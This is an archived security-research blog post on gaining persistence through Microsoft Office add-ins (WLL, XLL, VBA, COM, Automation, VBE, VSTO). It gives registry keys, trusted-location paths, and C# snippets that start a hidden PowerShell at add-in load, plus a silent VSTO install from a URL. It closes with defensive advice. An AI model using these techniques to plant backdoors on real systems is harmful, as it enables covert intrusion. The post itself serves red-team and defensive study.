@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+<meta name="x-subsite-id" content="1" />
+
+    <title>Add-In Opportunities for Office Persistence</title>
+
+    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
+    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">
+
+    <meta name="description" content="">
+    <link rel="canonical" href="https://labs.f-secure.com/archive/add-in-opportunities-for-office-persistence/">
+    <meta name="robots" content="NOODP,index,follow">
+
+    
+
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+
+    <meta name="format-detection" content="telephone=no">
+    
+    <meta property="og:title" content="">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="F-Secure Labs">
+    <meta property="og:url" content="https://labs.f-secure.com/archive/add-in-opportunities-for-office-persistence/">
+    
+    <meta property="og:locale" content='en_GB'>
+    <meta name="twitter:card" content="summary">
+    
+    <meta name="twitter:title" content="">
+    <meta name="twitter:description" content="">
+
+  <script>
+    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
+    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
+    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
+    (window,document,'script','dataLayer','GTM-KD9T85H');
+  </script>
+  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
+<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
+</head>
+<body class="BlogPost" dir="ltr">
+
+    <header class="head menu-opened" id="top">
+	<div class="container">
+		<div class="col12">
+			<div class="logo">
+				<a href="/">F-Secure</a>
+			</div>
+		    <a href="/archive/add-in-opportunities-for-office-persistence/#nav" class="btn-menu">Menu</a>
+
+<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
+    <ul>
+        
+            <li class="link nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
+        
+            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
+        
+            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
+        
+            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
+        
+            <li class="section nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
+        
+        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
+    </ul>
+</nav>
+
+		</div>
+	</div>
+</header>
+
+
+    <div class="wrapper">
+
+        <section class="section">
+  <div class="page-title">
+    <div class="container">
+      <span class="content-type">Blog</span>
+      <h1>Add-In Opportunities for Office Persistence</h1>
+      
+      
+      <p class="blog-post-meta">
+	
+
+	21 April 2017
+</p>
+
+      
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <div class="col8">
+      <div class="blog-post">
+        
+        <h1>Introduction</h1><p>One software product that attackers will almost certainly find in the environments that they're targeting is Microsoft Office.  Office applications due to this ubiquity present a consistent source of opportunity for persistence mechanisms.</p><p>This post will explore various opportunities for gaining persistence through native Microsoft Office functionality.  It was inspired by Kostas Lintovois’ similar work which identified ways to persist in transient Virtual Desktop Infrastructure (VDI) environments through adding a VBA backdoor to Office template files (“<a href="publications/one-template-to-rule-em-all/">One Template to Rule ‘Em All</a>”).</p><p>The following opportunities for Office-based persistence will be discussed, along with the relative benefits and disadvantages of each (from a red team perspective as we’re talking about obtaining persistence):</p><ol><li>WLL and XLL add-ins for Word.</li>
+<li>VBA add-ins for Excel and PowerPoint.</li>
+<li>COM add-ins for all Office products.</li>
+<li>Automation add-ins for Excel.</li>
+<li>VBA editor (VBE) add-ins for all VBA using Office products.</li>
+<li>VSTO add-ins for all Office products.</li>
+</ol><p>The described persistence techniques were tested with Office 2013 running on Windows 7, 8.1 and 10.</p><h1>WLL and XLL “Add-Ins” for Word and Excel</h1><p>Key to the work by Kostas and others on persistence using Office templates was the concept of “Trusted Locations”.  Files located here containing VBA code are not subject to the standard restrictions imposed by the macro settings, and the code will be executed without warning even if macros are disabled.  Further research, however, found that certain trusted locations to which a typical standard user has write privileges could also be used to host DLL-based add-ins.</p><h2>WLL “Add-Ins” for Word</h2><p>The three default locations for Word are shown below.  It can be seen that the purposes of the trusted locations are split between “templates” and “StartUp” functionality.</p><p> <img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCwxOTFd/WLL1.png" alt="WLL1" width="600" height="191"></p><p>Further investigation of this “StartUp” trusted location found that it could host “Word Add-Ins” of a “*.wll” extension.  This is an archaic extension dating back to the days of Word 97 but appears to still be supported, and there’s little documentation on how to actually create such a file.  After some research it was identified that a “*.wll” file is essentially a DLL with additional “Office-specific extensions”.  This means it supports basic DLL functionality, and therefore you can just rename a “*.dll” to a “*.wll”, put it in the “StartUp” trusted location which defaults to a location within the user’s home directory, and get arbitrary code execution when Word starts, all from a low privileged user.</p><p>An example of this can be seen below, where a WLL add-in launches "calc.exe", and can be seen running as a child of the Word process, "WINWORD.EXE".</p><p><img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCw0MV0/calc-process-tree.png" alt="calc process tree" width="600" height="41"></p><p>For anyone testing this with DLLs generated through Metasploit's "<a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom">msfvenom</a>" you’ll find that the payload gets executed when Word starts but Word then crashes.  I found that constructing a bare bones C++ DLL that executed code directly within DllMain resolved the issue and allowed Word to continue execution.</p><p>One interesting behavior of Word for WLL add-ins is that despite being loaded automatically, and their containing code executed, Word lists them as an “inactive” add-in.  Furthermore, and potentially because of this, disabling add-ins within Word’s Trust Center does not disable WLL add-ins.</p><p> <img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCw3M10/WLL3.png" alt="WLL3" width="600" height="73"></p><h2>XLL “Add-Ins” for Excel</h2><p>Excel has a similar means of extending its functionality using DLLs which are known as XLL add-ins, and have the “*.xll” extension.  Unlike WLL add-ins which are automatically loaded when Word opens, Excel needs to be configured to use an XLL add-in through adding a property to an existing registry key.  This key is located at:</p><pre>HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Excel\Options</pre><p>An “OPEN” property should be added which contains the value of “/R FileNameOfAddIn.xll”.</p><p> <img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCwxMDNd/XLL1.png" alt="XLL1" width="600" height="103"></p><p>A full path does not need to specified, as Excel defaults to looking in “%appdata%\Microsoft\AddIns” for the add-in file.   Interestingly, this location is not specified in the trusted locations as was the case with WLL add-ins.  This is potentially because the trusted locations are primarily focused on providing security controls around VBA execution.</p><p>The way that Excel uses XLL add-ins also differs to the way Word uses WLL add-ins.  For each configured XLL add-in, Excel will look for exported functions in the DLL and call them as appropriate.  For example, Excel will look for and call a function with the name of “xlAutoOpen” when the process first loads.  This function as the name suggests mimics the behavior of VBA’s “Auto_Open()”.</p><p>Unlike WLL add-ins, XLL add-ins are listed as being “active” within Excel’s add-in manager, and can be prevented from loading by disabling add-ins within the Trust Center.</p><h2>Benefits</h2><ol><li>No administrative rights needed to write to the user’s “StartUp” location, or configure registry keys.</li>
+<li>Automatically loaded for Word, and only minimal registry edits are required for Excel.</li>
+<li>WLL add-ins are not prevented from loading by enabling “Disable all Application Add-ins”. This does not apply to XLL add-ins.</li>
+<li>WLL add-ins are listed as being "Inactive" in Word's GUI for monitoring add-ins, despite actually being "Active". This does not apply to XLL add-ins.</li>
+<li>They can potentially be used for persistence in Virtual Desktop Infrastructure (VDI) environments.</li>
+</ol><h2>Disadvantages</h2><ol><li> Dropping a DLL into "%appdata%".</li>
+<li> Registry edits are required for XLL add-ins.</li>
+</ol><h1>VBA “Add-Ins” for Excel and PowerPoint</h1><p>Similar to Word, both Excel and PowerPoint have an equivalent “StartUp” trusted location.  In fact, they each have two – one that’s user-specific and one that’s system-wide.  The user-specific trusted locations (as that’s where a low privilege user will have write permissions) are referred to as “XLSTART” and “AddIn” for Excel and PowerPoint respectfully.</p><p>These trusted locations are not intended to store DLL-based add-ins, but instead ones that are VBA-based with a non-standard extension intended specifically for add-ins.</p><p>This particular persistence vector most closely aligns with Kostas’ work on template persistence.  The key distinction between the two approaches is that when VBA is included within a template, it is only executed in documents that derive from that template.  VBA add-ins will execute for their specific event handlers whenever any document is opened within Excel and PowerPoint regardless of their originating template, but this functionality is limited to these two Office applications.</p><p>The approach to implementing each persistence vector is described below.</p><h2>Excel</h2><p>Create a new Excel spreadsheet, open the VBA editor, and insert a "Module" which contains the persistence mechanism.</p><p> <img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCwyMjRd/VBA-EX-1.png" alt="VBA EX 1" width="600" height="224"></p><p>Go to save the spreadsheet, but instead of choosing a standard Excel format choose select “Excel Add-In” from the type menu which uses “*.xlam” or “*.xla” depending on the compatibility mode.  This should be saved to the appropriate trusted location which is typically “%appdata%\Microsoft\Excel\XLSTART”.</p><p> <img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCwyNDRd/VBA-EX-2.png" alt="VBA EX 2" width="600" height="244"></p><p>When Excel is next opened the add-in will be executed regardless of whether it’s a new spreadsheet or one that’s been previously saved.</p><h2>PowerPoint</h2><p>PowerPoint VBA Add-Ins can be created in the same manner as with Excel, but in this case the file format is "*.ppam" or "*.ppa".  The add-in should then be stored in the appropriate Trusted Location, which as mentioned previously this is referred to as “AddIns” in the case of PowerPoint.  It is also typically located at the rather generic looking location of “%appdata%\Microsoft\AddIns”, which is also used for the XLL add-ins.</p><p>Unlike with Excel, PowerPoint add-ins are not automatically loaded but can be configured to through modifying the registry.  Thankfully such modification only needs to occur in the HKEY_CURRENT_USER (HKCU) hive.  This involves creating a key at the following location:</p><pre>HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\PowerPoint\AddIns\&lt;AddInName&gt;</pre><p>Note that the Office number may also need to be changed, and the 15.0 here refers to Office 2013.  This key should then have the following properties. “Autoload” is set to “1” to indicate that it should load the add-in automatically when PowerPoint starts.  A full “Path” to the add-in does not need to be provided as PowerPoint is aware of the location it is required to load add-ins from.</p><p><img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCw5Ml0/VBA-PP-1.png" alt="VBA PP 1" width="600" height="92"></p><h2>Benefits</h2><ol><li>No administrative rights needed.</li>
+<li>Automatically loaded for Excel.</li>
+<li>"Trusted Location" so there are no problems executing VBA.</li>
+<li>Despite the file type being an “Add-In”, the “Disable all Application Add-Ins” option does not prevent the VBA code from executing.</li>
+<li>You can password protect the Add-In for viewing and editing – but it will still be executed.</li>
+<li>It can potentially be used for persistence in VDI environments.</li>
+</ol><h2>Disadvantages</h2><ol><li>Having to endure the excruciating process of writing VBA code.</li>
+<li>In the case of PowerPoint VBA Add-Ins having to write to the registry.</li>
+<li>Dropping additional files to disk for both Excel and PowerPoint.</li>
+</ol><h1>Office COM Add-Ins</h1><p>A wholly different way to create add-ins for Office is “COM add-ins”.  Due to the manner in which COM add-ins work, it is possible to create a single add-in and have this integrated into all Office applications (including Outlook).  For example, to run code when such Office programs open.</p><p>COM objects (which are stored as “*.dll” files, although are different to traditional DLLs) must be registered (in the registry) before use.  Primarily this involves notifying Windows about the COM object (i.e., setting it up in the HKEY_CLASSES_ROOT hive).  This registration process is defined in the function specified with a “ComRegisterFunctionAttribute” attribute. </p><p>Office applications must then be further configured to use this COM object which involves creating a single registry key with three properties.  This key must be created per application.  The registry key required to tell an Office program to load the COM add-in is stored at:</p><pre>HKEY_CURRENT_USER\Software\Microsoft\Office\&lt;Program&gt;\Addins\&lt;AddInName&gt;</pre><p>In this example, “3” for “LoadBehaviour” specifies that the Office application (here Outlook) should load the COM add-in at startup, and the COM add-in is referenced through a “FriendlyName”.</p><p> <img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCw4N10/COM-1.png" alt="COM 1" width="600" height="87"></p><p>The creation of the Office application keys can also be performed within the same function that is handling COM registration.  A key benefit of this is allowing the actions to deploy the persistence mechanism to be bundled together thus reducing the number of commands that need to be run to set it up – in this case one using “regasm.exe”.</p><p>With regards to getting code execution once an Office application loads the COM object, a good location for this in the code is in the "OnConnection" function of the Office-specific "IDTExtensibility2" interface.  This interface deals with add-in related events, such as for when an add-in is loaded (as with "OnConnection") and unloaded.  The example below shows a hidden cmd window spawning calc.</p><pre>public void OnConnection(object application, Extensibility.ext_ConnectMode connectMode, object addInInst, ref System.Array custom)
+{
+    /* snip */
+    System.Diagnostics.Process process = new System.Diagnostics.Process();
+    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+    startInfo.FileName = "powershell.exe";
+    startInfo.Arguments = "-ep bypass -C calc";
+    process.StartInfo = startInfo;
+    process.Start();
+}
+</pre><p>Once the COM add-in has been created it can be deployed as follows using regasm.exe which invokes the registration function.  This action requires administrative privileges as it writes to HKEY_CLASSES_ROOT.</p><p> <img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCwxMDld/COM-3.png" alt="COM 3" width="600" height="109"><a></a></p><p>In the example presented above, the add-in will be loaded when Outlook opens and we’ll be presented with calc.</p><h2>Benefits</h2><ol><li>Easy to create a single add-in that works across multiple Office products without adaptation.</li>
+<li>One command to setup (regasm).</li>
+</ol><h2>Disadvantages</h2><ol><li>Dropping the COM "*.dll" file to disk, and the registry edits required for it to be registered and automatically loaded.</li>
+<li>Requires administrative rights for COM registration.</li>
+<li>Unlikely to be useful for persistence in VDI environments.</li>
+</ol><h1>Excel Automation Add-In</h1><p>As part of its intention to be extensible Excel allows the creation of user defined functions.  Such functions would be executed, for example, as part of cell formulae (where “=SUM()” is an example of a built-in function).  These user defined functions are stored in what is known as “Automation Add-Ins”.  They’re created in a similar manner to COM Add-Ins, but have this specific use case.</p><p>There is a registration function as usual with COM, which can also include code to set up the registry to notify Excel that it should load this add-in at run time.  This key required is located at:</p><pre>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Excel\Options</pre><p>Each Automation add-in is listed as the value of a single “OPENx” property, where x is an incrementing number if multiple add-ins are enabled at one time.</p><p> <img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCw2Nl0/AUTO1.png" alt="AUTO1" width="600" height="66"></p><p>In terms of getting an Automation add-in to actually do something useful for the purposes of persistence, you define user defined functions simply as standard functions within a particular namespace (here “InconspicuousAddIn”) and class (here “ExtFunctions”) which gets referenced in the above registry property.  The function can do anything a normal function can, including executing arbitrary commands.  The example below shows a user defined function that counts the number of cells in a selected range after it opens calc.</p><pre>public double CountCellsRange(object range)
+{
+    System.Diagnostics.Process process = new System.Diagnostics.Process();
+    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+    startInfo.FileName = "powershell.exe";
+    startInfo.Arguments = "-ep bypass -C calc";
+    process.StartInfo = startInfo;
+    process.Start();
+
+    Excel.Range count = range as Excel.Range;
+    return count.Cells.Count;
+}
+</pre><p>To deploy the persistence mechanism, as Excel Automation add-ins are COM-based, regasm can be used once again using the same syntax as for the COM add-in.  As can be seen below, post-regasm, the Automation add-in is now enabled:</p><p> <img class="leftAlone" title="" src="assets/Uploads/AUTO2.png" alt="AUTO2" width="491" height="436"></p><p>Once a user defined function is integrated into Excel, an attacker would still need to find a way to have this command executed.  Unfortunately, it doesn’t appear that you can overwrite built-in functions.  Moreover, user defined functions only execute when they are called, and will not execute again if they’ve previously been executed and the result is stored in a document.</p><p>The user defined function therefore needs to be "forcefully" called, which can be done using VBA.  This is not ideal, but arguably makes it harder for defenders to detect than when putting a full VBA persistence stager in a template or add-in – it’s less likely to draw suspicion as it could easily be interpreted as a standard Excel function.  The following snippet of VBA is an example of how this could be achieved.  When the workbook opens, a cell is selected (obviously in practice something other than 1:1 - A1), and its contents are replaced with the text string of the user defined function call.</p><p> <img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCwxMTJd/AUTO3.png" alt="AUTO3" width="600" height="112"></p><h2>Benefits</h2><ol><li>One command to setup (regasm).</li>
+</ol><h2>Disadvantages</h2><ol><li>Requires administrative rights for COM registration.</li>
+<li>You still need a way of calling the user defined function.</li>
+<li>Unlikely to be useful for persistence in VDI environments.</li>
+</ol><h1>VBE Add-Ins</h1><p>It is possible to create a persistence mechanism that does not leverage VBA itself, but the development environment for creating it – the VBA editor (VBE).  The documentation for creating VBE add-ins is scarce; however, it was found to be based on the now familiar COM object using Office’s "IDTExtensibility2" interface.  Through this COM object, arbitrary code could be executed on, for example, the launch of the VBA editor.  As COM is used once again, it can be deployed using regasm.  This deployment includes the creation of the registry key to inform the VBA editor that it should automatically load the add-in.  This key is stored at:</p><pre>HKEY_CURRENT_USER\Software\Microsoft\VBA\VBE\6.0\Addins\&lt;VBEAddIn.Name&gt;</pre><p>The key also contains a number of properties, which include a “FriendlyName” to refer to the registered COM object, and setting “LoadBehaviour” to “3” to inform the VBA editor to launch the add-in when the editor starts.</p><p> <img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCw5N10/VBE1.png" alt="VBE1" width="600" height="97"></p><p>The configured add-in can be seen within the VBA editor’s “Add-In Manager”.</p><p> <img class="leftAlone" title="" src="assets/Uploads/VBE2.png" alt="VBE2" width="420" height="329"></p><h2>Benefits</h2><ol><li>Easy to create a single add-in that works across multiple Office products without adaptation.</li>
+<li>One command to setup (regasm).</li>
+</ol><h2>Disadvantages</h2><ol><li>Requires users to actually open the VBA editor!</li>
+<li>Requires administrative rights for COM registration.</li>
+<li>Unlikely to be useful for persistence in VDI environments.</li>
+</ol><h1>VSTO Add-Ins</h1><p>Visual Studio Tools for Office (VSTO) will also be covered here for the purposes of completeness.  VSTO is the replacement for COM add-ins in newer versions of Office (although the latter is still supported). Unlike COM add-ins, however, VSTO requires a special run time to be installed which is not installed by default.</p><p>A suitable place for storing persistence commands is the default “ThisAddIn-Startup” function which is configured to handle startup events (e.g., when the module is loaded when the application starts).  An example is shown below.</p><pre>private void ThisAddIn_Startup(object sender, System.EventArgs e)
+{
+    System.Diagnostics.Process process = new System.Diagnostics.Process();
+    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+    startInfo.FileName = "powershell.exe";
+    startInfo.Arguments = "-ep bypass -C calc";
+    process.StartInfo = startInfo;
+    process.Start();
+}
+</pre><p>The problem with VSTO add-ins arise when it comes to deploying them.  In part this is due to the requirement for the special runtime.  If this is not installed, and there are minimal requirements to avoid detective security controls (unlikely), it can be installed silently with no user interaction ("vstor_redist.exe" in the example below).</p><p>The VSTO add-in (“*.vsto”) can then be installed using a binary (“VSTOInstaller.exe”) which is part of the runtime.</p><p> <img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCwzNF0/VSTO1.png" alt="VSTO1" width="600" height="34"></p><p>Unfortunately, this causes a pop up requiring the user to confirm the installation. You can add a "/s" for silent but the project needs to be signed by a trusted publisher or it will default to “Don't Install” and silently fail.</p><p> <img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzUzMiwyNTNd/VSTO2.png" alt="VSTO2" width="532" height="253"></p><p>Interestingly "VSTOInstaller.exe" is a Microsoft signed binary and the location of the add-in can be specified as a URL (e.g., "VSTOInstaller.exe /s /i http://192.168.7.129/OutlookAddIn1.vsto").  Initially this seems interesting as a potential application whitelisting bypass if a signed VSTO add-in is used.  Unfortunately, Window’s trust model would restrict this.  Although a user (or at least the organisation’s system administration team) may trust many certification authorities within the “Trusted Root” store, this trust is not implicitly extended to allow them to “publish” updates to software, and instead there is a separate “Trusted Publisher” store for this which certification authorities have to be explicitly enabled in.</p><h2>Benefits</h2><ol><li>Runtime installer ("VSTOInstaller.exe") is an MS signed binary, and can download (silently) the add-in over HTTP, although it needs to be from a trusted publisher.</li>
+</ol><h2>Disadvantages</h2><ol><li>Requires non-standard VSTO runtime.</li>
+<li>Can't install silently without being signed by a trusted publisher, although a user might manually install it given that it’s an add-in for a trusted program.</li>
+<li>Unlikely to be useful for persistence in VDI environments.</li>
+</ol><h1>Defending Against Malicious Add-Ins</h1><p>Malicious XLL, COM, Automation, and VSTO add-ins can easily be prevented through disabling add-ins within each Office application’s Trust Center (or through the appropriate registry keys).</p><p> <img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCwxNzJd/DEF1.png" alt="DEF1" width="600" height="172"></p><p>Alternatively, if add-ins are required, it is recommend they are required to be signed by a trusted publisher, and that user notifications are disabled.  The user notifications that are presented when untrusted add-ins are used provide limited warning against potential security risk, and users may enable the content, especially if they’re opening a previously trusted document (e.g., one they’ve created).  An example of a user notification is provided below.</p><p><img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCw4NV0/DEF2.png" alt="DEF2" width="600" height="85"></p><p>Although the WLL and VBA add-ins self-define as add-ins, they’re not affected by the above Trust Center setting.  This is particularly surprising in the case of WLL add-ins given it’s a DLL-based add-in.</p><p>The most effective way to mitigate against the risk of malicious WLL and VBA add-ins is to remove the “StartUp” trusted locations for each if they are not used.  If they are required, at least for Excel and PowerPoint consider putting the required add-ins in the system-wide trusted location for this purpose, and removing the trusted location that exists within the user profile.  This would force an attacker to escalate their privileges in order to use the system-wide location as a persistence mechanism.  In both cases, organisations could also look to ensure that appropriate access control lists are established for the trusted locations in order to prevent users from adding or editing existing files. </p><p>It is further recommended that organisations look to develop a detective capability around identifying malicious add-ins.  Three core aspects to this involve examining and validating the file system contents of the trusted locations, auditing the registry entries relevent for enabling add-ins, and monitoring for non-standard process relationships (e.g., examining the processes spawned by Office applications).</p><p> </p>
+      </div>
+      <div class="social-share">
+        <p><span class="content-type">Share</span></p>
+        <ul class="social">
+  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/archive/add-in-opportunities-for-office-persistence/" target="_blank">Share on Facebook</a></li>
+  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/archive/add-in-opportunities-for-office-persistence/&text=Add-In Opportunities for Office Persistence" target="_blank">Share on LinkedIn</a></li>
+  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/archive/add-in-opportunities-for-office-persistence/&title=Add-In Opportunities for Office Persistence" target="_blank">Share on Twitter</a></li>
+</ul>
+
+      </div>
+    </div>
+    <div class="col4">
+      
+
+      
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="container">
+      <div class="col12">
+        <p>&nbsp;</p>
+      </div>
+    </div>
+  </section>
+
+
+    </div>
+
+    <footer class="foot">
+	<div class="container">
+    <div class="footer-flex-wrap">
+     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
+      <ul class="top-menu">
+        <li><a href="/archive/add-in-opportunities-for-office-persistence/#top" class="btn-gototop">Top</a></li>
+        
+        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
+        
+        
+      </ul>
+   </div>
+   <hr/>
+    <div class="col5 suf1 foot-about">
+      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
+    </div>
+    <div class="col3">
+      <ul class="footer-list no-margin">
+        
+        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
+        
+        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
+        
+        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
+        
+      </ul>
+    </div>
+    <div class="col3">
+     <ul class="footer-list">
+      
+      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
+      
+      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
+      
+      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
+      
+    </ul>
+  </div>
+</div>
+<div class="end">
+ <div class="container">
+  <hr/>
+  <div class="footer-flex-wrap">
+   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
+    <ul class="social">
+      
+      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
+      
+      
+      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
+      
+      
+      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
+      
+    </ul>
+ </div>
+</div>
+</div>
+</footer>
+
+    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>
+
+    
+    <script src="/themes/mwr/js/min/slides.min.js"></script>
+    
+
+    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>
+
+    <script type="application/ld+json">
+    { "@context" : "http://schema.org",
+      "@type" : "Organization",
+      "name" : "F-Secure Labs",
+      "url" : "https://labs.f-secure.com",
+      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
+      "sameAs" : [
+          "https://twitter.com/fsecurelabs",
+          "https://www.linkedin.com/showcase/28493188"],
+      "contactPoint" : [
+        { "@type" : "ContactPoint",
+          "telephone" : "+441256300920",
+          "contactType" : "customer service"
+        } ]
+    }
+    </script>
+</body>
+</html>
